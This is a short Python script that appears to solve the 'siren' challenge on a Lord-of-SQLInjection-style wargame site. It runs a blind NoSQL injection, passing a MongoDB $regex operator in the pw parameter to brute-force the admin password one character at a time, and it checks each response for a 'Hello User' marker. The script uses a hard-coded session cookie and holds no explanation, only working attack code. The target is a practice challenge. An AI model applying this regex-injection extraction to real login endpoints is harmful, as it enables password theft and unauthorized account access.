import requests
import string
import time


pw=""
a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/siren_9e402fc1bc38574071d8369c2c3819ba.php"
cookies = {'PHPSESSID':'tq37qs365cufgcpm3p42i13pg6'}
for i in range(1,9):
    for j in a:
        pw_=pw
        pw_+=j
        url="https://los.rubiya.kr/chall/siren_9e402fc1bc38574071d8369c2c3819ba.php?id=admin&pw[$regex]=^"+str(pw_)+".*"
        res = requests.get(url,cookies=cookies)
        res = res.text
        print(pw_)
        if "<br><h2>Hello User</h2>" in res:
            pw+=j
            print("find")
            break
        else: 
            pass